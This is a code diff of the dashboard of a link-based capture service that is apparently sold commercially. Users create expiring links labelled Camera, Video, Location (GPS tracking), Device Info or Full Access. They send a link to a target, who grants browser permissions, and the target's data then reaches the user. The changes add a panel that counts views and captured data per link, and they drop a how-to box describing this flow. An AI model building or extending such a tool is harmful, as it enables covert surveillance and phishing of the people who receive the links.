@@ -8,15 +8,15 @@
 <style>
   :root{--bg:#05070f;--accent:#22d3ee;--accent-2:#a855f7;--accent-3:#10b981;--gold:#fbbf24;--danger:#ef4444;--text:#fff;--text-dim:rgba(255,255,255,0.6);--glass:rgba(255,255,255,0.04);--glass-2:rgba(255,255,255,0.08);--border:rgba(255,255,255,0.08);--border-2:rgba(255,255,255,0.15);}
   *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
-  body{font-family:'Plus Jakarta Sans',-apple-system,sans-serif;background:var(--bg);color:var(--text);min-height:100vh;position:relative;-webkit-font-smoothing:antialiased;}
+  body{font-family:'Plus Jakarta Sans',-apple-system,sans-serif;background:var(--bg);color:var(--text);min-height:100vh;position:relative;}
   body::before{content:'';position:fixed;inset:0;background:radial-gradient(ellipse at 15% 0%,rgba(168,85,247,0.35) 0%,transparent 50%),radial-gradient(ellipse at 85% 100%,rgba(34,211,238,0.3) 0%,transparent 50%);z-index:-2;}
   .container{max-width:960px;margin:0 auto;padding:20px 18px 40px;}
   .hidden{display:none !important;}
   .navbar{position:sticky;top:0;z-index:100;background:rgba(5,7,15,0.75);backdrop-filter:blur(24px);border-bottom:1px solid var(--border);padding:12px 18px;display:flex;justify-content:space-between;align-items:center;}
   .brand{display:flex;align-items:center;gap:11px;font-family:'Space Grotesk',sans-serif;font-weight:700;font-size:1.05rem;}
-  .brand-logo{width:38px;height:38px;border-radius:11px;background:linear-gradient(135deg,var(--accent),var(--accent-2));display:flex;align-items:center;justify-content:center;font-size:1.15rem;box-shadow:0 8px 24px rgba(34,211,238,0.35);font-weight:800;color:#000;}
+  .brand-logo{width:38px;height:38px;border-radius:11px;background:linear-gradient(135deg,var(--accent),var(--accent-2));display:flex;align-items:center;justify-content:center;font-size:1.15rem;font-weight:800;color:#000;}
   .brand-text{display:flex;flex-direction:column;line-height:1.1;}
-  .brand-text small{font-size:0.6rem;letter-spacing:0.15em;text-transform:uppercase;color:var(--accent);opacity:0.9;}
+  .brand-text small{font-size:0.6rem;letter-spacing:0.15em;text-transform:uppercase;color:var(--accent);}
   .nav-user{display:flex;align-items:center;gap:10px;font-size:0.85rem;}
   .nav-avatar{width:36px;height:36px;border-radius:50%;background:linear-gradient(135deg,var(--accent),var(--accent-2));display:flex;align-items:center;justify-content:center;font-weight:700;color:#000;font-size:0.85rem;overflow:hidden;}
   .nav-avatar img{width:100%;height:100%;object-fit:cover;}
@@ -24,14 +24,14 @@
   .plan-badge.trial{background:rgba(148,163,184,0.15);color:#cbd5e1;border:1px solid rgba(148,163,184,0.3);}
   .plan-badge.pro{background:linear-gradient(135deg,var(--gold),#f59e0b);color:#000;}
   .card{background:var(--glass);backdrop-filter:blur(20px);border:1px solid var(--border);border-radius:22px;padding:24px;margin-bottom:18px;box-shadow:0 20px 50px rgba(0,0,0,0.4);}
-  .card h2{font-family:'Space Grotesk',sans-serif;font-size:1.1rem;margin-bottom:16px;display:flex;align-items:center;gap:8px;}
+  .card h2{font-family:'Space Grotesk',sans-serif;font-size:1.1rem;margin-bottom:16px;display:flex;align-items:center;gap:8px;flex-wrap:wrap;}
   button{padding:13px 22px;border-radius:12px;font-weight:600;font-size:0.92rem;cursor:pointer;transition:0.25s;font-family:inherit;border:none;display:inline-flex;align-items:center;justify-content:center;gap:8px;}
   button:active:not(:disabled){transform:scale(0.97);}
   button:disabled{opacity:0.4;cursor:not-allowed;}
   button.primary{background:linear-gradient(135deg,var(--accent),var(--accent-2));color:#000;box-shadow:0 8px 24px rgba(34,211,238,0.4);}
   button.secondary{background:var(--glass-2);color:#fff;border:1px solid var(--border-2);}
   button.danger{background:rgba(239,68,68,0.15);color:#fca5a5;border:1px solid rgba(239,68,68,0.35);}
-  button.whatsapp{background:linear-gradient(135deg,#25d366,#128c7e);color:#fff;font-weight:700;}
+  button.whatsapp{background:linear-gradient(135deg,#25d366,#128c7e);color:#fff;}
   button.small{padding:9px 14px;font-size:0.8rem;}
   button.block{width:100%;}
   input{width:100%;padding:14px 16px;border-radius:12px;border:1px solid var(--border-2);background:rgba(0,0,0,0.3);color:#fff;font-size:0.95rem;outline:none;margin-bottom:14px;font-family:inherit;}
@@ -42,10 +42,6 @@
   .profile-avatar img{width:100%;height:100%;object-fit:cover;}
   .profile-info h2{font-family:'Space Grotesk',sans-serif;font-size:1.1rem;margin-bottom:3px;}
   .profile-info p{font-size:0.8rem;opacity:0.6;}
-  .how-to-use{background:linear-gradient(135deg,rgba(16,185,129,0.08),rgba(34,211,238,0.08));border:1px solid rgba(16,185,129,0.3);border-radius:16px;padding:18px;margin-bottom:18px;font-size:0.85rem;line-height:1.7;}
-  .how-to-use h3{font-family:'Space Grotesk',sans-serif;font-size:0.95rem;margin-bottom:10px;color:var(--accent-3);}
-  .how-to-use ol{padding-left:20px;}
-  .how-to-use li{margin-bottom:6px;opacity:0.85;}
   .usage-bar{background:rgba(0,0,0,0.35);border-radius:12px;padding:16px;margin-bottom:16px;border:1px solid var(--border);}
   .usage-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;font-size:0.82rem;}
   .usage-header .count{font-weight:700;font-family:'Space Grotesk',sans-serif;}
@@ -55,17 +51,17 @@
   .usage-fill{height:100%;border-radius:10px;background:linear-gradient(90deg,var(--accent-3),var(--accent));transition:width 0.5s;}
   .usage-fill.warn{background:linear-gradient(90deg,var(--gold),#f97316);}
   .usage-fill.danger{background:linear-gradient(90deg,var(--danger),#dc2626);}
-  .feature-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:12px;}
-  .feature-btn{background:var(--glass);border:1px solid var(--border);border-radius:18px;padding:22px 14px;cursor:pointer;transition:0.25s;text-align:center;color:#fff;display:flex;flex-direction:column;align-items:center;gap:10px;font-family:inherit;}
+  .feature-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(140px,1fr));gap:12px;}
+  .feature-btn{background:var(--glass);border:1px solid var(--border);border-radius:18px;padding:20px 12px;cursor:pointer;transition:0.25s;text-align:center;color:#fff;display:flex;flex-direction:column;align-items:center;gap:8px;font-family:inherit;}
   .feature-btn:hover:not(:disabled){background:var(--glass-2);border-color:var(--accent);transform:translateY(-5px);}
   .feature-btn:disabled{opacity:0.5;cursor:not-allowed;}
-  .feature-btn .fb-icon{width:54px;height:54px;border-radius:15px;background:linear-gradient(135deg,rgba(34,211,238,0.15),rgba(168,85,247,0.15));border:1px solid rgba(34,211,238,0.25);display:flex;align-items:center;justify-content:center;font-size:1.6rem;}
-  .feature-btn .fb-title{font-weight:700;font-size:0.92rem;font-family:'Space Grotesk',sans-serif;}
-  .feature-btn .fb-desc{font-size:0.7rem;opacity:0.55;}
-  .stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(110px,1fr));gap:12px;}
+  .feature-btn .fb-icon{width:50px;height:50px;border-radius:14px;background:linear-gradient(135deg,rgba(34,211,238,0.15),rgba(168,85,247,0.15));border:1px solid rgba(34,211,238,0.25);display:flex;align-items:center;justify-content:center;font-size:1.5rem;}
+  .feature-btn .fb-title{font-weight:700;font-size:0.9rem;font-family:'Space Grotesk',sans-serif;}
+  .feature-btn .fb-desc{font-size:0.68rem;opacity:0.55;}
+  .stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(100px,1fr));gap:12px;}
   .stat-box{background:linear-gradient(160deg,rgba(34,211,238,0.08),rgba(168,85,247,0.08));border:1px solid rgba(34,211,238,0.2);border-radius:16px;padding:16px 12px;text-align:center;}
-  .stat-box h3{font-family:'Space Grotesk',sans-serif;font-size:1.65rem;color:var(--accent);}
-  .stat-box p{font-size:0.68rem;opacity:0.65;text-transform:uppercase;letter-spacing:0.06em;}
+  .stat-box h3{font-family:'Space Grotesk',sans-serif;font-size:1.55rem;color:var(--accent);}
+  .stat-box p{font-size:0.65rem;opacity:0.65;text-transform:uppercase;letter-spacing:0.06em;}
   .media-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:12px;}
   .media-card{background:rgba(255,255,255,0.03);border:1px solid var(--border);border-radius:16px;overflow:hidden;transition:0.25s;}
   .media-card:hover{border-color:var(--accent);transform:translateY(-4px);}
@@ -78,7 +74,6 @@
   .toast{position:fixed;top:80px;right:16px;left:16px;max-width:400px;margin-left:auto;background:linear-gradient(135deg,var(--accent-3),#059669);color:#fff;padding:14px 18px;border-radius:14px;font-weight:600;font-size:0.88rem;box-shadow:0 16px 40px rgba(16,185,129,0.5);opacity:0;transform:translateY(-24px);transition:all 0.4s;z-index:2000;pointer-events:none;}
   .toast.show{opacity:1;transform:translateY(0);}
   .toast.error{background:linear-gradient(135deg,var(--danger),#b91c1c);}
-  .toast.info{background:linear-gradient(135deg,var(--accent),var(--accent-2));color:#000;}
   .modal{position:fixed;inset:0;background:rgba(0,0,0,0.96);display:none;align-items:center;justify-content:center;z-index:500;padding:20px;}
   .modal.active{display:flex;}
   .modal-content{max-width:100%;max-height:90vh;border-radius:16px;overflow:hidden;}
@@ -88,8 +83,8 @@
   @keyframes spin{to{transform:rotate(360deg);}}
   .link-popup{position:fixed;inset:0;background:rgba(0,0,0,0.85);backdrop-filter:blur(12px);display:none;align-items:center;justify-content:center;z-index:600;padding:20px;overflow-y:auto;}
   .link-popup.active{display:flex;}
-  .link-popup-inner{background:linear-gradient(160deg,rgba(20,26,53,0.98),rgba(10,14,31,0.98));border:1px solid rgba(34,211,238,0.4);border-radius:24px;padding:28px 22px;max-width:440px;width:100%;box-shadow:0 30px 80px rgba(34,211,238,0.3);position:relative;}
-  .link-popup-icon{width:70px;height:70px;border-radius:20px;background:linear-gradient(135deg,var(--accent-3),var(--accent));display:flex;align-items:center;justify-content:center;font-size:2rem;margin:0 auto 16px;box-shadow:0 16px 40px rgba(34,211,238,0.4);}
+  .link-popup-inner{background:linear-gradient(160deg,rgba(20,26,53,0.98),rgba(10,14,31,0.98));border:1px solid rgba(34,211,238,0.4);border-radius:24px;padding:28px 22px;max-width:440px;width:100%;position:relative;}
+  .link-popup-icon{width:70px;height:70px;border-radius:20px;background:linear-gradient(135deg,var(--accent-3),var(--accent));display:flex;align-items:center;justify-content:center;font-size:2rem;margin:0 auto 16px;}
   .link-popup h3{font-family:'Space Grotesk',sans-serif;font-size:1.2rem;text-align:center;margin-bottom:6px;}
   .link-popup p{text-align:center;font-size:0.82rem;opacity:0.7;margin-bottom:20px;}
   .link-name-box{background:rgba(0,0,0,0.4);border:1px solid rgba(34,211,238,0.3);border-radius:14px;padding:14px 16px;margin-bottom:14px;}
@@ -101,20 +96,28 @@
   .link-url-box{background:rgba(0,0,0,0.5);border:1px solid rgba(34,211,238,0.25);border-radius:12px;padding:12px 14px;margin-bottom:16px;font-family:'Space Grotesk',monospace;font-size:0.75rem;color:var(--accent);word-break:break-all;max-height:100px;overflow-y:auto;}
   .link-popup-close{position:absolute;top:14px;right:14px;width:36px;height:36px;border-radius:10px;background:rgba(255,255,255,0.08);color:#fff;font-size:1rem;border:1px solid rgba(255,255,255,0.15);cursor:pointer;}
   .info-box{background:linear-gradient(135deg,rgba(34,211,238,0.08),rgba(168,85,247,0.08));border:1px solid rgba(34,211,238,0.25);border-radius:14px;padding:16px;font-size:0.82rem;line-height:1.55;margin-bottom:14px;}
-  .info-box b{color:var(--accent);}
   .req-box{background:linear-gradient(135deg,rgba(251,191,36,0.1),rgba(251,191,36,0.05));border:1px solid rgba(251,191,36,0.4);border-radius:14px;padding:16px;margin-bottom:14px;}
   .req-box h3{font-family:'Space Grotesk',sans-serif;font-size:0.95rem;color:var(--gold);margin-bottom:8px;}
   .req-box p{font-size:0.82rem;opacity:0.8;line-height:1.5;margin-bottom:12px;}
-  .expiry-popup{position:fixed;inset:0;background:rgba(0,0,0,0.88);backdrop-filter:blur(12px);display:none;align-items:center;justify-content:center;z-index:700;padding:20px;overflow-y:auto;}
+  .expiry-popup{position:fixed;inset:0;background:rgba(0,0,0,0.88);backdrop-filter:blur(12px);display:none;align-items:center;justify-content:center;z-index:700;padding:20px;}
   .expiry-popup.active{display:flex;}
-  .expiry-inner{background:linear-gradient(160deg,rgba(20,26,53,0.98),rgba(10,14,31,0.98));border:1px solid rgba(251,191,36,0.4);border-radius:24px;padding:26px 22px;max-width:440px;width:100%;position:relative;}
+  .expiry-inner{background:linear-gradient(160deg,rgba(20,26,53,0.98),rgba(10,14,31,0.98));border:1px solid rgba(251,191,36,0.4);border-radius:24px;padding:26px 22px;max-width:440px;width:100%;}
   .expiry-inner h3{font-family:'Space Grotesk',sans-serif;font-size:1.15rem;text-align:center;margin-bottom:6px;}
   .expiry-inner p{text-align:center;font-size:0.82rem;opacity:0.7;margin-bottom:20px;}
   .expiry-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-bottom:16px;}
   .expiry-opt{padding:14px 8px;border-radius:12px;background:rgba(255,255,255,0.05);border:1px solid var(--border-2);color:#fff;font-weight:700;font-size:0.82rem;cursor:pointer;font-family:inherit;transition:0.2s;}
   .expiry-opt:hover{background:rgba(34,211,238,0.15);border-color:var(--accent);}
   .expiry-opt.selected{background:linear-gradient(135deg,var(--accent),var(--accent-2));color:#000;border-color:var(--accent);}
-  @media (max-width:480px){.feature-grid{grid-template-columns:repeat(2,1fr);gap:10px;}.media-grid{grid-template-columns:repeat(2,1fr);}.feature-btn{padding:18px 10px;}.feature-btn .fb-icon{width:46px;height:46px;font-size:1.35rem;}}
+  .my-link-item{background:rgba(255,255,255,0.03);border:1px solid var(--border);border-radius:14px;padding:14px;margin-bottom:10px;}
+  .my-link-item.expired{border-color:rgba(239,68,68,0.3);}
+  .link-stats-row{display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;margin-bottom:10px;}
+  .link-stat{background:rgba(34,211,238,0.08);border:1px solid rgba(34,211,238,0.2);border-radius:10px;padding:8px;text-align:center;}
+  .link-stat.green{background:rgba(16,185,129,0.08);border-color:rgba(16,185,129,0.2);}
+  .link-stat.gold{background:rgba(251,191,36,0.08);border-color:rgba(251,191,36,0.2);}
+  .link-stat.red{background:rgba(239,68,68,0.08);border-color:rgba(239,68,68,0.2);}
+  .link-stat .num{font-family:'Space Grotesk',sans-serif;font-size:1.1rem;font-weight:800;}
+  .link-stat .lbl{font-size:0.6rem;opacity:0.7;text-transform:uppercase;letter-spacing:0.05em;margin-top:2px;}
+  @media (max-width:480px){.feature-grid{grid-template-columns:repeat(2,1fr);gap:10px;}.media-grid{grid-template-columns:repeat(2,1fr);}}
 </style>
 </head>
 <body>
@@ -145,16 +148,6 @@
 
   <div id="requestBox"></div>
 
-  <div class="how-to-use">
-    <h3>📖 Kaise Use Karein</h3>
-    <ol>
-      <li>Neeche se koi feature select karo</li>
-      <li>Link expiry chuno (5 min سے 24 hours تک)</li>
-      <li>Link popup me khulega — Copy karo</li>
-      <li>Client ko bhejo → Allow karega → data aapke paas</li>
-    </ol>
-  </div>
-
   <div class="card">
     <h2>📊 Your Plan</h2>
     <div id="usageContent"></div>
@@ -162,14 +155,19 @@
 
   <div class="card">
     <h2>🎯 Create Link</h2>
-    <p style="opacity:0.65;font-size:0.82rem;margin-bottom:16px;">Feature select karo → link generate hoga</p>
     <div class="feature-grid" id="featureGrid">
-      <button class="feature-btn" onclick="generateLink('camera', this)"><div class="fb-icon">📷</div><div class="fb-title">Camera</div><div class="fb-desc">Photo capture</div></button>
-      <button class="feature-btn" onclick="generateLink('video', this)"><div class="fb-icon">🎥</div><div class="fb-title">Video</div><div class="fb-desc">Video recording</div></button>
-      <button class="feature-btn" onclick="generateLink('location', this)"><div class="fb-icon">📍</div><div class="fb-title">Location</div><div class="fb-desc">GPS tracking</div></button>
-      <button class="feature-btn" onclick="generateLink('device', this)"><div class="fb-icon">📱</div><div class="fb-title">Device Info</div><div class="fb-desc">Phone details</div></button>
-      <button class="feature-btn" onclick="generateLink('all', this)"><div class="fb-icon">⚡</div><div class="fb-title">Full Access</div><div class="fb-desc">Sab kuch</div></button>
+      <button class="feature-btn" onclick="generateLink('camera', this)"><div class="fb-icon">📷</div><div class="fb-title">Camera</div><div class="fb-desc">Photo</div></button>
+      <button class="feature-btn" onclick="generateLink('video', this)"><div class="fb-icon">🎥</div><div class="fb-title">Video</div><div class="fb-desc">Recording</div></button>
+      <button class="feature-btn" onclick="generateLink('location', this)"><div class="fb-icon">📍</div><div class="fb-title">Location</div><div class="fb-desc">GPS</div></button>
+      <button class="feature-btn" onclick="generateLink('device', this)"><div class="fb-icon">📱</div><div class="fb-title">Device</div><div class="fb-desc">Info</div></button>
+      <button class="feature-btn" onclick="generateLink('all', this)"><div class="fb-icon">⚡</div><div class="fb-title">Full</div><div class="fb-desc">All</div></button>
     </div>
+  </div>
+
+  <div class="card">
+    <h2>🔗 My Links <span style="font-size:0.7rem;background:linear-gradient(135deg,var(--accent),var(--accent-2));color:#000;padding:3px 10px;border-radius:20px;font-weight:700;margin-left:auto;" id="linksCount">0</span></h2>
+    <p style="opacity:0.65;font-size:0.82rem;margin-bottom:16px;">Aapke tamam links — views aur captures ke saath</p>
+    <div id="myLinksList"></div>
   </div>
 
   <div class="card">
@@ -189,7 +187,6 @@
   </div>
 </div>
 
-<!-- LINK POPUP -->
 <div class="link-popup" id="linkPopup">
   <div class="link-popup-inner">
     <button class="link-popup-close" onclick="closeLinkPopup()">✕</button>
@@ -206,29 +203,28 @@
     </div>
     <div class="link-url-box" id="popupUrl"></div>
     <button class="primary block" onclick="copyPopupLink()" style="margin-bottom:10px;font-size:1rem;padding:15px;">📋 Copy Link</button>
-    <button class="secondary block" onclick="shareWhatsApp()" style="margin-bottom:10px;">💬 WhatsApp par Share</button>
-    <button class="secondary block" onclick="closeLinkPopup()">Band Karo</button>
+    <button class="secondary block" onclick="shareWhatsApp()" style="margin-bottom:10px;">💬 WhatsApp</button>
+    <button class="secondary block" onclick="closeLinkPopup()">Close</button>
   </div>
 </div>
 
-<!-- EXPIRY POPUP -->
 <div class="expiry-popup" id="expiryPopup">
   <div class="expiry-inner">
     <h3>⏰ Link Expiry Chuno</h3>
-    <p>Link kitni der tak valid rahe?</p>
+    <p>Kitni der tak valid rahe?</p>
     <div class="expiry-grid" id="expiryGrid">
       <button class="expiry-opt" data-min="5">5 min</button>
       <button class="expiry-opt" data-min="15">15 min</button>
       <button class="expiry-opt selected" data-min="30">30 min</button>
-      <button class="expiry-opt" data-min="60">1 ghanta</button>
-      <button class="expiry-opt" data-min="360">6 ghante</button>
-      <button class="expiry-opt" data-min="1440">24 ghante</button>
+      <button class="expiry-opt" data-min="60">1 hr</button>
+      <button class="expiry-opt" data-min="360">6 hr</button>
+      <button class="expiry-opt" data-min="1440">24 hr</button>
     </div>
-    <label style="display:block;font-size:0.78rem;opacity:0.7;margin-bottom:6px;">یا خود لکھو (minutes):</label>
-    <input type="number" id="customExpiry" placeholder="مثلاً 45" min="1" style="margin-bottom:16px;">
+    <label style="display:block;font-size:0.78rem;opacity:0.7;margin-bottom:6px;">Custom (minutes):</label>
+    <input type="number" id="customExpiry" placeholder="e.g. 45" min="1" style="margin-bottom:16px;">
     <div style="display:flex;gap:10px;">
       <button class="secondary" style="flex:1;" onclick="cancelExpiry()">Cancel</button>
-      <button class="primary" style="flex:2;" onclick="confirmExpiry()">✅ Link Banao</button>
+      <button class="primary" style="flex:2;" onclick="confirmExpiry()">✅ Create</button>
     </div>
   </div>
 </div>
@@ -273,13 +269,14 @@ let userRequest = null;
 let pendingFeature = null;
 let selectedExpiry = 30;
 let pendingBtnEl = null;
+let allMyLinks = [];
 
-window.showToast = function(msg, isError = false, isInfo = false) {
+window.showToast = function(msg, isError = false) {
   const t = document.getElementById("toast");
   t.textContent = msg;
-  t.className = "toast show" + (isError ? " error" : isInfo ? " info" : "");
+  t.className = "toast show" + (isError ? " error" : "");
   clearTimeout(t._to);
-  t._to = setTimeout(() => t.className = "toast", 3500);
+  t._to = setTimeout(() => t.className = "toast", 3000);
 }
 
 function generateRandomName() {
@@ -293,13 +290,15 @@ function generateRandomName() {
   return `${a}-${n}-${num}-${r1}${r2}`;
 }
 
+function escapeHtml(s) {
+  if (s == null) return "";
+  return String(s).replace(/[&<>"']/g, m => ({ "&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;" }[m]));
+}
+
 onAuthStateChanged(auth, async (user) => {
   if (user) {
     currentUser = user;
-    if (user.email === ADMIN_EMAIL) {
-      location.href = "admin.html";
-      return;
-    }
+    if (user.email === ADMIN_EMAIL) { location.href = "admin.html"; return; }
     try {
       const userSnap = await getDoc(doc(db, "users", user.uid));
       if (userSnap.exists()) userData = userSnap.data();
@@ -317,6 +316,7 @@ onAuthStateChanged(auth, async (user) => {
     document.getElementById("dashboardView").classList.remove("hidden");
     await loadUserStats();
     await renderMedia();
+    await loadMyLinks();
     renderPlanCard();
     renderRequestBox();
     updateFeatureButtons();
@@ -346,7 +346,7 @@ function renderPlanCard() {
   const card = document.getElementById("usageContent");
   if (!userData) return;
   if (userData.plan === "pro") {
-    card.innerHTML = `<div class="info-box" style="text-align:center;"><div style="font-size:1.6rem;margin-bottom:8px;">👑</div><b style="font-size:1rem;">Pro Plan Active</b><br><span style="opacity:0.7;font-size:0.82rem;">Unlimited links aur features</span></div>`;
+    card.innerHTML = `<div class="info-box" style="text-align:center;"><b style="font-size:1rem;">👑 Pro Plan Active</b><br><span style="opacity:0.7;font-size:0.82rem;">Unlimited links</span></div>`;
     return;
   }
   const used = userData.linksUsed || 0;
@@ -355,11 +355,10 @@ function renderPlanCard() {
   const level = pct >= 100 ? "danger" : pct >= 66 ? "warn" : "";
   card.innerHTML = `
     <div class="usage-bar">
-      <div class="usage-header"><span style="opacity:0.75;">Free Trial Links</span><span class="count ${level}">${used} / ${FREE_TRIAL_LIMIT}</span></div>
+      <div class="usage-header"><span style="opacity:0.75;">Free Trial</span><span class="count ${level}">${used} / ${FREE_TRIAL_LIMIT}</span></div>
       <div class="usage-track"><div class="usage-fill ${level}" style="width:${pct}%"></div></div>
-      <p style="font-size:0.78rem;opacity:0.65;margin-top:10px;">${left > 0 ? `<b>${left}</b> links remaining.` : "Trial khatam!"}</p>
-    </div>
-  `;
+      <p style="font-size:0.78rem;opacity:0.65;margin-top:10px;">${left > 0 ? `<b>${left}</b> links remaining` : "Trial khatam!"}</p>
+    </div>`;
 }
 
 function renderRequestBox() {
@@ -368,18 +367,18 @@ function renderRequestBox() {
   if (userData.plan === "pro") { box.innerHTML = ""; return; }
   if (userRequest) {
     if (userRequest.status === "pending") {
-      box.innerHTML = `<div class="req-box"><h3>⏳ Request Pending</h3><p>Full Access request bhej di gayi hai. Admin approve karega.</p></div>`;
+      box.innerHTML = `<div class="req-box"><h3>⏳ Request Pending</h3><p>Admin approve karega.</p></div>`;
     } else if (userRequest.status === "approved") {
-      box.innerHTML = `<div class="req-box" style="background:linear-gradient(135deg,rgba(16,185,129,0.15),rgba(16,185,129,0.05));border-color:rgba(16,185,129,0.4);"><h3 style="color:var(--accent-3);">✅ Approved!</h3><p>Full Access mil gaya! Refresh karein.</p></div>`;
+      box.innerHTML = `<div class="req-box" style="border-color:rgba(16,185,129,0.4);"><h3 style="color:var(--accent-3);">✅ Approved!</h3><p>Refresh karein.</p></div>`;
       setTimeout(async () => {
         const snap = await getDoc(doc(db, "users", currentUser.uid));
         if (snap.exists()) { userData = snap.data(); renderPlanCard(); renderRequestBox(); updateFeatureButtons(); }
       }, 2000);
-    } else if (userRequest.status === "rejected") {
-      box.innerHTML = `<div class="req-box" style="background:rgba(239,68,68,0.1);border-color:rgba(239,68,68,0.4);"><h3 style="color:#fca5a5;">❌ Rejected</h3><p>Admin ne reject kar diya.</p><button class="whatsapp block" onclick="openWhatsApp()" style="margin-top:12px;">💬 WhatsApp</button></div>`;
+    } else {
+      box.innerHTML = `<div class="req-box" style="background:rgba(239,68,68,0.1);border-color:rgba(239,68,68,0.4);"><h3 style="color:#fca5a5;">❌ Rejected</h3></div>`;
     }
   } else {
-    box.innerHTML = `<div class="req-box"><h3>👑 Full Access Request</h3><p>Unlimited links ke liye request bhejein.</p><button class="primary block" onclick="sendRequest()" style="margin-bottom:10px;">📩 Request Full Access</button><button class="whatsapp block" onclick="openWhatsApp()">💬 WhatsApp — ${PRO_PRICE} PKR</button></div>`;
+    box.innerHTML = `<div class="req-box"><h3>👑 Full Access Request</h3><p>Unlimited links ke liye request bhejein.</p><button class="primary block" onclick="sendRequest()" style="margin-bottom:10px;">📩 Request</button><button class="whatsapp block" onclick="openWhatsApp()">💬 WhatsApp ${PRO_PRICE} PKR</button></div>`;
   }
 }
 
@@ -406,7 +405,6 @@ function updateFeatureButtons() {
   document.querySelectorAll("#featureGrid .feature-btn").forEach(btn => { btn.disabled = isTrialExhausted; });
 }
 
-/* ===== GENERATE LINK with Expiry Choice ===== */
 window.generateLink = async function(feature, btnEl) {
   if (!currentUser || !userData) return showToast("Login karo", true);
   if (userData.plan === "trial" && (userData.linksUsed || 0) >= FREE_TRIAL_LIMIT) {
@@ -462,7 +460,10 @@ window.confirmExpiry = async function() {
       hostname: location.hostname,
       createdAt: serverTimestamp(),
       expiresAt: Timestamp.fromDate(expiresAt),
-      used: false
+      used: false,
+      views: 0,
+      viewedBy: [],
+      captureCount: 0
     });
 
     await updateDoc(doc(db, "users", currentUser.uid), { linksUsed: increment(1) });
@@ -475,6 +476,7 @@ window.confirmExpiry = async function() {
     openLinkPopup(linkId, feature, url, expiresAt);
     renderPlanCard();
     updateFeatureButtons();
+    loadMyLinks();
   } catch (e) {
     showToast("Link create nahi hua: " + e.message, true);
   } finally {
@@ -513,7 +515,7 @@ window.copyPopupLink = function() {
   if (!currentPopupLink) return;
   const url = currentPopupLink.url;
   if (navigator.clipboard && navigator.clipboard.writeText) {
-    navigator.clipboard.writeText(url).then(() => showToast("✅ Link copy!")).catch(() => fallbackCopy(url));
+    navigator.clipboard.writeText(url).then(() => showToast("✅ Copy!")).catch(() => fallbackCopy(url));
   } else fallbackCopy(url);
 }
 
@@ -535,7 +537,7 @@ window.shareWhatsApp = function() {
 window.openWhatsApp = function() {
   const name = userData?.name || currentUser?.displayName || "User";
   const email = currentUser?.email || "";
-  const msg = `Assalam o Alaikum!\n\nFull Access lena chahta hoon.\n\n👤 ${name}\n📧 ${email}\n💰 ${PRO_PRICE} PKR/month`;
+  const msg = `Assalam o Alaikum!\n\nFull Access lena chahta hoon.\n👤 ${name}\n📧 ${email}\n💰 ${PRO_PRICE} PKR/month`;
   window.open(`https://wa.me/${WHATSAPP_NUMBER}?text=${encodeURIComponent(msg)}`, "_blank");
 }
 
@@ -545,12 +547,101 @@ window.doLogout = async function() {
   location.href = "index.html";
 }
 
+/* ===== MY LINKS ===== */
+async function loadMyLinks() {
+  if (!currentUser) return;
+  try {
+    const q = query(collection(db, "links"), where("ownerId", "==", currentUser.uid));
+    const snap = await getDocs(q);
+    allMyLinks = snap.docs.map(d => ({ id: d.id, ...d.data() }));
+    allMyLinks.sort((a,b) => (b.createdAt?.seconds || 0) - (a.createdAt?.seconds || 0));
+    document.getElementById("linksCount").textContent = allMyLinks.length;
+    renderMyLinks();
+  } catch (e) { console.error("Load links error:", e); }
+}
+
+function renderMyLinks() {
+  const list = document.getElementById("myLinksList");
+  if (allMyLinks.length === 0) {
+    list.innerHTML = `<p style="text-align:center;opacity:0.5;padding:20px;">Abhi koi link nahi banayi</p>`;
+    return;
+  }
+
+  list.innerHTML = allMyLinks.map(link => {
+    const now = Date.now();
+    const expMs = link.expiresAt?.seconds ? link.expiresAt.seconds * 1000 : 0;
+    const isExpired = expMs < now;
+    const diff = expMs - now;
+    const hoursLeft = Math.floor(diff / (1000*60*60));
+    const minsLeft = Math.floor((diff % (1000*60*60)) / (1000*60));
+
+    let timeText = "";
+    if (isExpired) timeText = "❌ Expired";
+    else if (hoursLeft > 0) timeText = `${hoursLeft}h ${minsLeft}m`;
+    else timeText = `${minsLeft}m`;
+
+    const featureIcons = { camera: "📷", video: "🎥", location: "📍", device: "📱", all: "⚡" };
+    const icon = featureIcons[link.feature] || "🔗";
+    const views = link.views || 0;
+    const captures = link.captureCount || 0;
+    const website = link.website || "Modsir Tools";
+    const createdAt = link.createdAt?.seconds ? new Date(link.createdAt.seconds*1000).toLocaleDateString() : "-";
+
+    return `
+      <div class="my-link-item ${isExpired ? 'expired' : ''}">
+        <div style="display:flex;align-items:center;gap:12px;margin-bottom:10px;">
+          <div style="width:42px;height:42px;border-radius:12px;background:linear-gradient(135deg,rgba(34,211,238,0.15),rgba(168,85,247,0.15));border:1px solid rgba(34,211,238,0.3);display:flex;align-items:center;justify-content:center;font-size:1.2rem;">${icon}</div>
+          <div style="flex:1;min-width:0;">
+            <div style="font-family:'Space Grotesk',sans-serif;font-size:0.85rem;font-weight:700;word-break:break-all;">${link.id}</div>
+            <div style="font-size:0.68rem;opacity:0.6;margin-top:2px;">🌐 ${escapeHtml(website)} • ${link.feature}</div>
+          </div>
+        </div>
+        <div class="link-stats-row">
+          <div class="link-stat"><div class="num" style="color:var(--accent);">${views}</div><div class="lbl">👁️ Views</div></div>
+          <div class="link-stat green"><div class="num" style="color:var(--accent-3);">${captures}</div><div class="lbl">📸 Data</div></div>
+          <div class="link-stat ${isExpired ? 'red' : 'gold'}"><div class="num" style="color:${isExpired ? 'var(--danger)' : 'var(--gold)'};font-size:0.7rem;margin-top:6px;">${timeText}</div><div class="lbl">Status</div></div>
+        </div>
+        <div style="display:flex;gap:6px;">
+          <button class="secondary small" style="flex:1;" onclick="copyLinkById('${link.id}')">📋 Copy</button>
+          <button class="secondary small" style="flex:1;" onclick="openLinkById('${link.id}')">👁️</button>
+          <button class="danger small" onclick="deleteLinkById('${link.id}')">🗑️</button>
+        </div>
